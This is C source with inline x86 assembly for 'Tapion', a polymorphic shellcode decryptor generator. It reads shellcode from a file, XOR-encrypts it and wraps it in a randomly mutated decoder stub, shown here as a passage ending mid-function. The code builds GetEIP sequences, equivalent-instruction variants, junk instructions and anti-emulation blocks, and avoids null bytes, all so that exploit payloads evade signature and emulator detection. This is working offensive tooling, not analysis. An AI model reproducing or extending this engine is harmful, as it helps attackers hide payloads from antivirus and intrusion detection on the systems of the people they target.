  /*

  			        
		-------------------------------------------------------
                 TAPION POLYMORPHIC DECRYPTOR GENERATOR
         -------------------------------------------------------
			     by Piotr Bania <bania.piotr@gmail.com>
				      http://pb.specialised.info

					     All rights reserved!

  



				"If the world hates you, keep in mind that it hated me first."
										  #John 15:18


  */



#include "main.h"
#include "t_poly.h"
#include "opcodes.h"


#define	   MAX_SHELL_SIZE   1500
#define	   MAX_BUFFOR_SIZE	MAX_SHELL_SIZE + 9096	

#define	   DEBUG_IT			0
#define	   DO_NULL			1

#define	   B1_VARIANT		0
#define	   B2_VARIANT       1
#define	   B3_VARIANT		1
#define	   B4_VARIANT		0
#define	   B6_VARIANT       0
#define	   B7_VARIANT		0
#define	   B10_VARIANT		0

#define	   MAX_GARBAGE		5
#define	   G_NO				0
#define	   G_COPRO			1
#define	   G_BOTH			2

#define	   MAX_STEP_INC		3
#define	   MAX_STEP_DEC		4


/* random numbers --------------------------------------------------------------  */

int copro_init;
int garbage_flag;
DWORD garbage_size;

char filename[MAX_PATH+1];
int last_randomized = 0;
int choosen_var = 0;
int hard_var = 0;
DWORD fix_magic;

int do_jumps;
int was_add;
int magic_store;
int przed_magic;
int step_inc;
int step_dec;
int f_decr;
int f2_decr;
int f3_decr;
int garbage_global_flag;

DWORD where_call;
DWORD DwordAleatorio1;
DWORD DwordAleatorio2;
DWORD DwordAleatorio3;



void setup_random(void)
{
	SYSTEMTIME st;

	GetSystemTime(&st);

	DwordAleatorio1 = st.wSecond ^ st.wMilliseconds ^ st.wMinute;
	DwordAleatorio2 = GetTickCount();
	


	_asm {
		rdtsc
		xor		dword ptr [DwordAleatorio2],eax
	};

	DwordAleatorio3 = DwordAleatorio1 ^ DwordAleatorio2;

}

DWORD get_random(void)
{

	DWORD temp;

	_asm {
   		mov     eax, [DwordAleatorio1]       			// Get 1st seed
   		dec     dword ptr [DwordAleatorio1]  			// Decrease to avoid linearity
      	xor     eax, [DwordAleatorio2]       			// XOR with 2nd seed
      	mov     ecx, eax                         		// Result in CL
  	   	rol     dword ptr [DwordAleatorio1], cl 		// ROL the 1st seed CL
                                                  		// times (random)
        add     [DwordAleatorio1], eax    				// Add (1st XOR 2nd) to 1st
        adc     eax, [DwordAleatorio2] 					// Add the 2nd seed to (1st XOR 2nd)
                                     			        // with CF (random CF at the moment)
        add     eax, ecx        						// EAX=(1st XOR 2nd)+2nd+CF
        ror     eax, cl         						// EAX=EAX ROL (byte)(1st XOR 2nd)
        not     eax             						// NOT (this breaks a possible proximity)
        sub     eax, 3          						// Subtract odd constant (break the linearity)
        xor     [DwordAleatorio2], eax	 				// Modify 2nd seed
        xor     eax, [DwordAleatorio3] 					// XOR 3rd seed with the until-this-
                                           			    // moment result
        rol     dword ptr [DwordAleatorio3], 1  		// Modify 3rd seed (ROL)...
        sub     dword ptr [DwordAleatorio3], ecx 		// ...and with a 1st/2nd
                                           		        // seed dependant variable
        sbb     dword ptr [DwordAleatorio3], 4 			// Subtract a constant value
                                           		        // that could be 4 or 5
        inc     dword ptr [DwordAleatorio2] 			// Break linearity on 2nd seed
		mov		temp,eax
 
	};

	return temp;
}

DWORD random_eax(DWORD max_value)
{
	DWORD num,num2 = NULL;
	num = get_random();

	_asm {
		xor		edx,edx
		mov		eax,num
		mov		ecx,max_value
		div		ecx
		mov		num2,edx
	}

	return num2;
		

}


DWORD random_without_zero(void)
{
	DWORD r;

gen_again:
	r = random_eax(0x91111111);

	_asm {
		mov		eax,r
		cmp		al,0
		je		gen_again
		cmp		ah,0
		je		gen_again
		bswap	eax
		cmp		al,0
		je		gen_again
		cmp		ah,0
		je		gen_again
	}

	return r;

}

int is_good_num(DWORD r)
{
		_asm {
		mov		eax,r
		cmp		al,0
		je		gen_bad
		cmp		ah,0
		je		gen_bad
		bswap	eax
		cmp		al,0
		je		gen_bad
		cmp		ah,0
		je		gen_bad
	}

		return true;

gen_bad: return false;

}



/* instruction generator --------------------------------------------------------------  */

int	 gen_instruction(unsigned char *loc, BYTE prefix, DWORD i_num, char operand[], BYTE src_reg, BYTE dst_reg)
{
	int roz = 2, pre = 0;
	unsigned char *p, *p2;
	BYTE temp_modrm;
	p = loc;
	p2 = loc;

	// if there is any prefix store it
	if (prefix != NULL)
	{
		*(BYTE*)p = prefix;
		p++;
	}
	else {
		if (t_op_tbl[i_num].prefix != NO_M)
			*(BYTE*)loc = t_op_tbl[i_num].prefix;
	}



	// no modrm instruction firstly
	if (t_op_tbl[i_num].modrm == NO_M)
	{
		roz = 1;


		// nothing to change?
		if (t_op_tbl[i_num].flag == C_NONE)
		{
			*(BYTE*)p = t_op_tbl[i_num].opcode;
			p++;
			goto finish_i;
		}

		// mutate opcode
		*(BYTE*)p = (t_op_tbl[i_num].opcode & 0xF8) | src_reg;
	

		p++;
		goto finish_i;
	}

	roz = 2;
	*(BYTE*)p = t_op_tbl[i_num].opcode;
	p++;

	// if it is 16 bit command decrease the operand size
	if (prefix == P_16b) 
	{
		roz += 2;
		pre = 1;
	}


	temp_modrm = t_op_tbl[i_num].modrm;

	if (t_op_tbl[i_num].flag == C_SRC || t_op_tbl[i_num].flag == C_BOTH)
	{
		// change source reg in modrm
		temp_modrm = (t_op_tbl[i_num].modrm & 0xF8) | src_reg;
	}

	if (t_op_tbl[i_num].flag == C_DST || t_op_tbl[i_num].flag == C_BOTH)
	{
		// change dest reg in modrm
		temp_modrm = (temp_modrm & 0xC7) | (dst_reg << 3);
	}
	
	*(BYTE*)p = temp_modrm;
	p++;

	if (t_op_tbl[i_num].sib != NO_M)
	{
		*(BYTE*)p = (t_op_tbl[i_num].sib & 0xF8) | src_reg;
		roz++;
		p++;
	}

	goto finish_i;



finish_i:
	
	if ((t_op_tbl[i_num].size-roz) < 0) goto finit_i2;
	if (operand != NULL)
	{
		for (int ix=0; ix != (t_op_tbl[i_num].size-roz); ix++)
		{
			*(BYTE*)p = operand[ix];
			p++;
		}
	}
	else
	{
		if ((t_op_tbl[i_num].size-roz) > 0)
		{
			*(DWORD*)p = random_without_zero();
			p+=4;
		}
	}

finit_i2:
	p += place_garbage(p);
	return ((DWORD)(p-p2));
	
}

void sample(void)
{
	DWORD s_size = 257, s_size2;
	DWORD to_shell = 0;

	BYTE temp_byte;
	DWORD loop_size;
	DWORD loop_b;
	DWORD where_loop;
	DWORD temp_size;
	DWORD temp_size2;
	DWORD pp_end;

	int to_shell_var = 0;

	int step_inc;
	int step_dec;
	int b_found = 0;

	char pak[MAX_BUFFOR_SIZE];							// MAX !!!! for now
	char shell[MAX_SHELL_SIZE];							// MAX SHELL SIZE
	char loop[2024];										// MAX SIZE FOR LOOP
	char temp_block[100];

	int r_rand;
	unsigned char *pp, *pp2, *dec_body, *shell_body;
	unsigned char *pp_loop;

	memset(&pak,0x0,sizeof(pak));
	memset(&loop,0x0,sizeof(loop));
	memset(&shell,0x0,sizeof(shell));


	hard_var = 0;
	s_size = read_shell_from_file((unsigned char*)&shell);
	s_size2 = s_size;

	pp = (unsigned char *)&pak;
	pp_loop = (unsigned char *)&loop;


	step_inc = random_eax(MAX_STEP_INC);				// step incs (possible zero)
	step_dec = random_eax(MAX_STEP_DEC) + 1;			// step decs (no zero possiblity)

	
	shell_body = (unsigned char*)&shell_body + s_size;


	// begin decryptor generator 
	// block 2 and 3 can be mixed (1 block is optional)

	r_rand = random_eax(2);
	garbage_flag = G_BOTH;


	if (r_rand == 0)		// store 1 block
		pp += gen_xor_reg((unsigned char*)pp,mut_regs_var[BLOCK1r]);


	r_rand = random_eax(2);

	garbage_flag = G_BOTH;

	if (r_rand == 0)
	{
		// store block 2 firstly then block 3 (get eip)
		pp += gen_mov_reg_num((unsigned char*)pp,mut_regs_var[BLOCK2r],s_size2);
		pp += gen_get_eip((unsigned char*)pp,mut_regs_var[BLOCK3r]);
	}
	else
	{
		// store block 2 as last one, block 3 is the first
		pp += gen_get_eip((unsigned char*)pp,mut_regs_var[BLOCK3r]);

		if (random_eax(3) == 1)
			pp += place_anti_emul((unsigned char*)pp, mut_regs_var[BLOCK3r], mut_regs_var[BLOCK2r]);

		pp += gen_mov_reg_num((unsigned char*)pp,mut_regs_var[BLOCK2r],s_size2);

	}


	
	
	if (random_eax(3) == 1)
	{
		garbage_flag = G_NO;
		pp += place_anti_emul((unsigned char*)pp, mut_regs_var[BLOCK3r], mut_regs_var[BLOCK6r]);
		garbage_flag = G_BOTH;

	}


	// block4 can be mixed with block 5
	// we will also need to fix the value laters

	garbage_flag = G_BOTH;
	loop_size = gen_decryptor_loop(pp_loop,step_inc,step_dec);

	
	// this will be generated at end 
	// we need to fix those values with shellcode size
		
	loop_b =  (DWORD)(pp - where_call);
	to_shell = loop_b + loop_size + s_size - 1;



		if (f_decr == 1)
			to_shell += step_dec;


	r_rand = random_eax(2);
		

	
	


	// we need to store those blocks localy and then generate mov_reg_num block
	// again with the same variant

	if (r_rand == 0)
	{

		// block 4 first then block 5
		temp_size = gen_copy_reg((unsigned char*)pp,mut_regs_var[BLOCK4r],mut_regs_var[BLOCK3r]);
		pp += temp_size;
		to_shell += temp_size;

		garbage_flag = G_NO;

		// store this to temp_block
		// !! BUG !! 
		// must use variant >= 7

		hard_var = 1;
		choosen_var = 7 + random_eax(4);
		temp_size = gen_mov_reg_num((unsigned char*)&temp_block,mut_regs_var[BLOCK5r],to_shell);
		to_shell += temp_size;

		pp += gen_mov_reg_num((unsigned char*)pp,mut_regs_var[BLOCK5r],to_shell);		
		hard_var = 0;
		garbage_flag = G_BOTH;


	}
	else 
	{
		// block 5 firstly then block 4		
		// store this block to temp location
		temp_size2 = gen_copy_reg((unsigned char*)&temp_block,mut_regs_var[BLOCK4r],mut_regs_var[BLOCK3r]);
		to_shell += temp_size2;

		// this block firstly
		choosen_var = 7 + random_eax(4);
		hard_var = 1;
		garbage_flag = G_NO;
		temp_size = gen_mov_reg_num((unsigned char*)pp,mut_regs_var[BLOCK5r],to_shell);
		to_shell += temp_size;
		pp += gen_mov_reg_num((unsigned char*)pp,mut_regs_var[BLOCK5r],to_shell);
		hard_var = 0;
		garbage_flag = G_BOTH;

		memcpy(pp,&temp_block,temp_size2);
		pp += temp_size2;
		
	}


	memcpy((void*)pp,(void*)pp_loop, loop_size);




	pp += loop_size;
	where_loop = (DWORD)pp;
	memcpy((void*)pp, (void*)&shell, s_size);
	pp2 = (unsigned char*)where_call + to_shell;
	pp_end = ((DWORD)pp + s_size) - (DWORD)&pak;
	

	pp = (unsigned char*)where_call;

	if (magic_store != 1)
		goto no_magic;


	while (1)
	{
		if ((DWORD)pp > (DWORD)(pp+loop_size))
			pp = (unsigned char*)where_call;

		pp += step_inc;

		if ((random_eax(8) == 5) && (*(BYTE*)pp != 0))
		{
			temp_byte = *(BYTE*)pp;
			pp = (unsigned char*)where_loop;

			while (1)
			{
				// scan for zero and replace it
				if (*(BYTE*)pp == 0)
				{
					*(BYTE*)pp = temp_byte;
					b_found = 1;
					break;
				}
				pp--;
			}

			if (b_found == 1) break;

		}

	}


no_magic:

	// now we need to xor the shellcode like the 
	// encoder/decoder does

	dec_body = (unsigned char*)where_call;

	int li = s_size2;


	while (li > 0)
	{

		if (f_decr == 1)
			pp2 -= step_dec;

		printf("[+] Crypting block %.08x with %x as key\n",(DWORD)pp2,*(DWORD*)dec_body);
		

		*(DWORD*)pp2 ^= *(DWORD*)dec_body;

	

		if (przed_magic == 1)						// reg with pass
			dec_body += step_inc;

		
		if (*(BYTE*)dec_body == temp_byte)
			dec_body = (unsigned char*)where_call;

		
		if (f_decr != 1)
			pp2 -= step_dec;

		if (przed_magic != 1)						// reg with pass
			dec_body += step_inc;

		li -= step_dec;

	}


	printf("[+] The decryptor body was generated!\n");
	printf("[+] Decryptor body size = %d bytes\n",(DWORD)(pp_end - s_size));
	printf("[+] Shellcode size = %d bytes\n",s_size);
	printf("[+] Decryptor + Shellcode size = %d bytes\n",pp_end);
	printf("[+] Magic byte is %X\n",temp_byte);
	printf("[+] Crypto steping = %d byte(s)\n",step_dec);
	printf("[+] Pass steping = %d byte(s)\n",step_inc);




	dump_shell_to_file((unsigned char*)&pak,pp_end + 5);
	


}


// ----------------------------------------------------------------------
// BLOCK 1:
// generates: xor reg,reg
// ----------------------------------------------------------------------


int	 gen_block1(unsigned char *loc, BYTE reg)
{
	
	#define BLOCK1_VAR_SIZE	9

	int variant;
	int total_size = 0;
	int t_size = 0;
	int li = 0;
	unsigned char *loc2;
	DWORD r_value, r1_value;

	loc2 = loc;


	// get a variant
	variant = random_eax(BLOCK1_VAR_SIZE + 1);
	
#if DEBUG_IT == 1
	variant = B1_VARIANT;
#endif

	if (hard_var == 1)
		variant = choosen_var;

	choosen_var = variant;



	switch (variant)
	{
		// variant 0:
		// xor reg,reg
		case 0:
			total_size += gen_instruction(loc, NULL, p_xor_reg_reg,NULL,reg,reg);
			break;

		// variant 1:
		// push BIG_NUM
		// pop  REG
		// sub  REG,BIG_NUM
		case 1:
			r_value = random_without_zero();
			loc += gen_instruction(loc, NULL, p_push_num,(char*)&r_value,NULL,NULL);
			loc += gen_instruction(loc, NULL, p_pop_reg,NULL,reg,NULL);
			loc += gen_instruction(loc, NULL, p_sub_reg_num,(char*)&r_value,reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;


		// variant 2:
		// push BIG_NUM(NEGATIVE)
		// pop  REG
		// add  reg,BIG_NUM(POSITIVE)
		case 2:
			r_value = random_without_zero() * (-1);  // damn in asm it is only NEG
			loc += gen_instruction(loc, NULL, p_push_num,(char*)&r_value,NULL,NULL);
			loc += gen_instruction(loc, NULL, p_pop_reg,NULL,reg,NULL);
			r_value = r_value * (-1);
			loc += gen_instruction(loc, NULL, p_add_reg_num,(char*)&r_value,reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;


		// variant 3:
		// mov reg,BIG_NUM
		// add reg,SOME_NUM
		// sub reg,BIG_NUM+SOME_NUM
		case 3:
			r_value = random_without_zero();
			r1_value = random_without_zero();
			loc += gen_instruction(loc, NULL, p_mov_reg_num,(char*)&r_value,reg,NULL);
			loc += gen_instruction(loc, NULL, p_add_reg_num,(char*)&r1_value,reg,NULL);
			r_value += r1_value;
			loc += gen_instruction(loc, NULL, p_sub_reg_num,(char*)&r_value,reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;


		// variant 4:
		// mov  reg,BIG_NUM+SOME_NUM(NEGATIVE)
		// add  reg,SOME_NUM
		// add  reg,BIG_NUM
		case 4:
			r_value = random_without_zero();
			r1_value = random_without_zero();
			r_value = (r_value + r1_value) * (-1);
			loc += gen_instruction(loc, NULL, p_mov_reg_num,(char*)&r_value,reg,NULL);
			loc += gen_instruction(loc, NULL, p_add_reg_num,(char*)&r1_value,reg,NULL);
			r_value = (r_value * (-1)) - r1_value;
			loc += gen_instruction(loc, NULL, p_add_reg_num,(char*)&r_value,reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;


		// variant 5:
		// mov  reg,BIG_NUM
		// sub  reg,BIG_NUM + random(1,5)
		// inc  reg * random(1,5)
		case 5:
			r_value = random_without_zero();
			r1_value = random_eax(5) + 1;
			loc += gen_instruction(loc, NULL, p_mov_reg_num,(char*)&r_value,reg,NULL);
			r_value += r1_value;
			loc += gen_instruction(loc, NULL, p_sub_reg_num,(char*)&r_value,reg,NULL);
			for (li = 0; li != r1_value; li++)
				loc += gen_instruction(loc, NULL, p_inc_reg,NULL,reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;

		// variant 6:
		// mov  reg,BIG_NUM
		// xor  reg,SOME_NUM
		// sub  reg,NUM_AFTER_XORING
		case 6:
			r_value = random_without_zero();
			r1_value = random_without_zero();
			loc += gen_instruction(loc, NULL, p_mov_reg_num,(char*)&r_value,reg,NULL);
			loc += gen_instruction(loc, NULL, p_xor_reg_num,(char*)&r1_value,reg,NULL);
			r_value = r_value ^ r1_value;
			loc += gen_instruction(loc, NULL, p_sub_reg_num,(char*)&r_value,reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;

		// variant 7:
		// sub reg,reg
		case 7:
			loc += gen_instruction(loc, NULL, p_sub_reg_reg,NULL,reg,reg);
			total_size = (DWORD)(loc-loc2);
			break;

		// variant 8:
		// mov reg,BIG_NUM
		// neg reg
		// add reg,BIG_NUM
		case 8:
			r_value = random_without_zero();
			loc += gen_instruction(loc, NULL, p_mov_reg_num,(char*)&r_value,reg,NULL);
			loc += gen_instruction(loc, NULL, p_neg_reg,NULL,reg,NULL);
			loc += gen_instruction(loc, NULL, p_add_reg_num,(char*)&r_value,reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;

		// variant 9:
		// mov reg,BIG_NUM
		// bswap reg
		// sub reg,BIG_NUM_SWAPPED
		default:
		case 9:
			r_value = random_without_zero();
			_asm {
				mov eax,r_value
				bswap eax
				mov r1_value,eax
			}
			loc += gen_instruction(loc, NULL, p_mov_reg_num,(char*)&r_value,reg,NULL);
			loc += gen_instruction(loc, NULL, p_bswap_reg,NULL,reg,NULL);
			loc += gen_instruction(loc, NULL, p_sub_reg_num,(char*)&r1_value,reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;

	}

	return total_size;
}



// ----------------------------------------------------------------------
// BLOCK 2:
// generates: mov reg,shellcode_size
// if possible 16 bit registers are used this must come together with
// nullyfing the register
// ----------------------------------------------------------------------

int	 gen_block2(unsigned char *loc, BYTE reg, DWORD s_size)
{
	
	#define BLOCK2_VAR_SIZE	9

	int variant;
	int total_size = 0;
	int li = 0;
	int P_16bX = P_16b;
	unsigned char *loc2;
	DWORD r1_value;

	loc2 = loc;

	// get a variant
	variant = random_eax(BLOCK2_VAR_SIZE + 1);


#if DEBUG_IT == 1
	variant = B2_VARIANT;
#endif


	// if s_size > 0xFFFF (MAX_WORD) => not use 16 bit registers
	if (s_size >= 0xF000)
	{
		printf("[!] Exceeded 16bit size, re-calculating the variant!\n");
		if (variant == 0) variant = 2;
		if (variant == 5) variant++;
		P_16bX = NULL;
	}


	if (hard_var == 1)
		variant = choosen_var;



	choosen_var = variant;



	switch (variant)
	{
		// variant 0:
		// mov reg16b,s_size
		case 0:
#if DO_NULL == 1
			if (P_16bX == P_16b)
				loc += gen_block1(loc,reg);
			

#endif
			choosen_var = variant;
			loc += gen_instruction(loc, P_16bX, p_mov_reg_num,(char*)&s_size,reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;

		// variant 1:
		// mov reg16b,s_size - random(1,5)
		// inc reg16b * random(1,5)
		case 1:
#if DO_NULL == 1
			if (P_16bX == P_16b)
				loc += gen_block1(loc,reg);
#endif

			r1_value = random_eax(5) + 1;

			if (hard_var == 1)
				r1_value = last_randomized;

			s_size -= r1_value;
			choosen_var = variant;
			last_randomized = r1_value;

			loc += gen_instruction(loc, P_16bX, p_mov_reg_num,(char*)&s_size,reg,NULL);
			for (li = 0; li != r1_value; li++)
				loc += gen_instruction(loc, NULL, p_inc_reg,NULL,reg,NULL);


			total_size = (DWORD)(loc-loc2);
			break;

		// variant 2:
		// mov   reg_16,s_size - SOME_NUM
		// add   reg_16,SOME_NUM
		case 2:
#if DO_NULL == 1
			if (P_16bX == P_16b)
				loc += gen_block1(loc,reg);
#endif
			choosen_var = variant;
			r1_value = random_without_zero();
			s_size -= r1_value;
			loc += gen_instruction(loc, P_16bX, p_mov_reg_num,(char*)&s_size,reg,NULL);
			loc += gen_instruction(loc, P_16bX, p_add_reg_num,(char*)&r1_value,reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;


		// variant 3:
		// mov   reg_16,s_size + SOME_NUM
		// sub   reg_16,SOME_NUM
		case 3:
#if DO_NULL == 1
			if (P_16bX == P_16b)
				loc += gen_block1(loc,reg);
#endif
			choosen_var = variant;
			r1_value = random_without_zero();
			s_size += r1_value;
			loc += gen_instruction(loc, P_16bX, p_mov_reg_num,(char*)&s_size,reg,NULL);
			loc += gen_instruction(loc, P_16bX, p_sub_reg_num,(char*)&r1_value,reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;

		// variant 4:
		// mov   reg_16,s_size xor SOME_NUM
		// xor   reg_16,SOME_NUM
		case 4:
#if DO_NULL == 1
			if (P_16bX == P_16b)
				loc += gen_block1(loc,reg);
#endif
			choosen_var = variant;
			r1_value = random_without_zero();
			s_size = s_size ^ r1_value;
			loc += gen_instruction(loc, P_16bX, p_mov_reg_num,(char*)&s_size,reg,NULL);
			loc += gen_instruction(loc, P_16bX, p_xor_reg_num,(char*)&r1_value,reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;

		// variant 5:
		// mov   reg_16,s_size + random(1,5)
		// dec	 reg_16 * random(1,5)
		case 5:
#if DO_NULL == 1
			if (P_16bX == P_16b)
				loc += gen_block1(loc,reg);
#endif
			choosen_var = variant;
			r1_value = random_eax(5) + 1;

			if (hard_var == 1)
				r1_value = last_randomized;

			last_randomized = r1_value;


			s_size += r1_value;
			loc += gen_instruction(loc, P_16bX, p_mov_reg_num,(char*)&s_size,reg,NULL);
			for (li = 0; li != r1_value; li++)
				loc += gen_instruction(loc, NULL, p_dec_reg,NULL,reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;


		// variant 6:
		// mov   reg_16,s_size(negative)
		// neg	 reg_16
		case 6:
#if DO_NULL == 1
			if (P_16bX == P_16b)
				loc += gen_block1(loc,reg);
#endif
			choosen_var = variant;
			s_size = s_size * (-1);
			loc += gen_instruction(loc, P_16bX, p_mov_reg_num,(char*)&s_size,reg,NULL);
			loc += gen_instruction(loc, P_16bX, p_neg_reg,NULL,reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;


		// variant 7:
		// mov   reg,s_size + SOME_NUM
		// sub	 reg,SOME_NUM
		case 7:
			r1_value = random_without_zero();
			s_size += r1_value;
			loc += gen_instruction(loc, NULL, p_mov_reg_num,(char*)&s_size,reg,NULL);
			loc += gen_instruction(loc, NULL, p_sub_reg_num,(char*)&r1_value,reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;

		// variant 8:
		// push s_size + SOME_NUM
		// pop reg
		// sub reg,SOME_NUM
		case 8:
			r1_value = random_without_zero();
			s_size += r1_value;
			loc += gen_instruction(loc, NULL, p_push_num,(char*)&s_size,NULL,NULL);
			loc += gen_instruction(loc, NULL, p_pop_reg,NULL,reg,NULL);
			loc += gen_instruction(loc, NULL, p_sub_reg_num,(char*)&r1_value,reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;

		// variant 9:
		// mov reg,swapped: s_size + SOME_NUM
		// bswap reg
		// sub reg,SOME_NUM
		default:
		case 9:
			r1_value = random_without_zero();
			s_size += r1_value;
			_asm {
				mov eax,s_size
				bswap eax
				mov s_size,eax
			};
			loc += gen_instruction(loc, NULL, p_mov_reg_num,(char*)&s_size,reg,NULL);
			loc += gen_instruction(loc, NULL, p_bswap_reg,NULL,reg,NULL);
			loc += gen_instruction(loc, NULL, p_sub_reg_num,(char*)&r1_value,reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;

	}

	return total_size;
}




// ----------------------------------------------------------------------
// BLOCK 3:
// generates: GetEIP instructions
// ----------------------------------------------------------------------

int gen_block3(unsigned char *loc, BYTE reg)
{
	#define BLOCK3_VAR_SIZE	9

	int variant;
	int variant_t;
	int total_size = 0;
	int li = 0;
	unsigned char *p;
	unsigned char *loc2;
	DWORD r1_value;

	loc2 = loc;

	// get a variant
	variant = random_eax(BLOCK3_VAR_SIZE + 1);
	variant_t = random_eax((sizeof(geip_table)/4));
	r1_value = random_without_zero();

	if (hard_var == 1)
		variant = choosen_var;

	choosen_var = variant;



	p = (unsigned char*)&geip_table;
	for (li = 0; li != sizeof(geip_table); li++)
	{
		
		//printf("Scanning: %x\n",*(BYTE*)(p+li));
		if (*(BYTE*)(p+li) == 0x04)
		{
			*(BYTE*)(p+li) = (0x04 & 0xC7) | (reg << 3);
			continue;
		}

		if (*(BYTE*)(p+li) == 0x50)
		{			
			*(BYTE*)(p+li) = (0x50 & 0xF8) | reg;
			continue;
		}

		if (*(BYTE*)(p+li) == 0x58)
		{
			*(BYTE*)(p+li) = (0x58 & 0xF8) | reg;
			continue;
		}

		if (*(BYTE*)(p+li) == 0xe0)
		{
			*(BYTE*)(p+li) = (0xe0 & 0xF8) | reg;
			continue;
		}
		if (*(BYTE*)(p+li) == 0xBB)
		{
			*(BYTE*)(p+li) = (BYTE)(r1_value);
			continue;
		}
	}


	r1_value = geip_table[variant_t];


#if DEBUG_IT == 1
	variant = B3_VARIANT;
#endif

	switch (variant)
	{

		// variant 0:
		// fldz
		// fnstenv	[esp-12]
		// pop reg
		case 0:
			*(WORD*)loc = 0xeed9;		// fldz
			where_call = (DWORD)loc;
			loc+=2;
			*(DWORD*)loc = 0xf42474d9; //  fnstenv	[esp-12]
			loc+=4;
			loc += gen_instruction(loc, NULL, p_pop_reg,NULL,reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;


		// variant 1:
		// push INSTR
		// mov reg,esp
		// call reg
		case 1:
			loc += gen_instruction(loc, NULL, p_push_num,(char*)&r1_value,NULL,NULL);
			loc += gen_instruction(loc, NULL, p_mov_reg_reg,NULL,_MR_ESP,reg);
			loc += gen_instruction(loc, NULL, p_call_reg,NULL,reg,NULL);
			where_call = (DWORD)loc - (DWORD)garbage_size;
			total_size = (DWORD)(loc-loc2);
			break;

		// variant 2:
		// mov reg,INSTR
		// push reg
		// mov reg,esp
		// call reg
		case 2:
			loc += gen_instruction(loc, NULL, p_mov_reg_num,(char*)&r1_value,reg,NULL);
			loc += gen_instruction(loc, NULL, p_push_reg,NULL,reg,NULL);
			loc += gen_instruction(loc, NULL, p_mov_reg_reg,NULL,_MR_ESP,reg);
			loc += gen_instruction(loc, NULL, p_call_reg,NULL,reg,NULL);
			where_call = (DWORD)loc - (DWORD)garbage_size;
			total_size = (DWORD)(loc-loc2);
			break;

		// variant 3:
		// push INSTR
		// lea reg,[esp]
		// call reg
		case 3:
			loc += gen_instruction(loc, NULL, p_push_num,(char*)&r1_value,NULL,NULL);
			loc += gen_instruction(loc, NULL, p_lea_reg_dreg,NULL,_MR_ESP,reg);
			loc += gen_instruction(loc, NULL, p_call_reg,NULL,reg,NULL);
			where_call = (DWORD)loc - (DWORD)garbage_size;
			total_size = (DWORD)(loc-loc2);
			break;

		// variant 4:
		// mov reg,INSTR
		// push reg
		// lea reg,[esp]
		// call reg
		default:
		case 4:
			loc += gen_instruction(loc, NULL, p_mov_reg_num,(char*)&r1_value,reg,NULL);
			loc += gen_instruction(loc, NULL, p_push_reg,NULL,reg,NULL);
			loc += gen_instruction(loc, NULL, p_lea_reg_dreg,NULL,_MR_ESP,reg);
			loc += gen_instruction(loc, NULL, p_call_reg,NULL,reg,NULL);
			where_call = (DWORD)loc - (DWORD)garbage_size;
			total_size = (DWORD)(loc-loc2);
			break;

	}

return total_size;

}


// ----------------------------------------------------------------------
// BLOCK 4:
// generates: mov reg1,reg2 (copy regs)
// ----------------------------------------------------------------------


int gen_block4(unsigned char *loc, BYTE src_reg, BYTE dst_reg)
{
	#define BLOCK4_VAR_SIZE	3

	int variant;
	int total_size = 0;
	int li = 0;
	unsigned char *loc2;

	loc2 = loc;

	// get a variant
	variant = random_eax(BLOCK4_VAR_SIZE + 1);

#if DEBUG_IT == 1
	variant = B4_VARIANT;
#endif


	if (hard_var == 1)
		variant = choosen_var;

	choosen_var = variant;

	if (hard_var != 1)
	{
		if (random_eax(3) == 1)
			loc += gen_block1(loc,src_reg);
	}



	

	switch (variant)
	{

		// variant 0:
		// mov reg,reg
		case 0:
			loc += gen_instruction(loc, NULL, p_mov_reg_reg,NULL,dst_reg,src_reg);
			total_size = (DWORD)(loc-loc2);
			break;


		// variant 1
		// push reg_src
		// pop  dst_reg
		case 1:
			loc += gen_instruction(loc, NULL, p_push_reg,NULL,dst_reg,NULL);
			loc += gen_instruction(loc, NULL, p_pop_reg,NULL,src_reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;

		// variant 2
		// xor dst_reg,dst_reg
		// add dst_reg,reg_src
		case 2:
			loc += gen_block1(loc,src_reg);
			loc += gen_instruction(loc, NULL, p_add_reg_reg,NULL,dst_reg,src_reg);
			total_size = (DWORD)(loc-loc2);
			break;


		// variant 3
		// push reg_src
		// xchg dst_reg,reg_src
		// pop reg_src
		case 3:
		default:
			loc += gen_instruction(loc, NULL, p_push_reg,NULL,dst_reg,NULL);
			loc += gen_instruction(loc, NULL, p_xchg_reg_reg,NULL,dst_reg,src_reg);
			loc += gen_instruction(loc, NULL, p_pop_reg,NULL,dst_reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;






	}

	return total_size;
}


// ----------------------------------------------------------------------
// BLOCK 6:
// generates: mov reg,[reg]
// ----------------------------------------------------------------------

int gen_block6(unsigned char *loc, BYTE src_reg, BYTE dst_reg)
{
	#define BLOCK6_VAR_SIZE	1

	int variant;
	int total_size = 0;
	int li = 0;
	unsigned char *loc2;

	loc2 = loc;

	// get a variant
	variant = random_eax(BLOCK6_VAR_SIZE + 1);


#if DEBUG_IT == 1
	variant = B6_VARIANT;
#endif

	if (hard_var == 1)
		variant = choosen_var;

	choosen_var = variant;


again_var:
	switch (variant)
	{

		// variant 0:
		// mov dst_reg,[src_reg]
		case 0:
			loc += gen_instruction(loc, NULL, p_mov_reg_dreg,NULL,dst_reg,src_reg);
			total_size = (DWORD)(loc-loc2);
			break;

		// variant 1:
		// push dword ptr [src_reg]
		// pop dst_reg
		default:
		case 1:
			loc += gen_instruction(loc, NULL, p_push_dreg,NULL,dst_reg,NULL);
			loc += gen_instruction(loc, NULL, p_pop_reg,NULL,src_reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;

		// variant 2:
		// if SRC_REG == ESI
		// if DST_REG != EAX => do push/pop preserve
		// lodsd
		// sub esi,4	

		case 2:
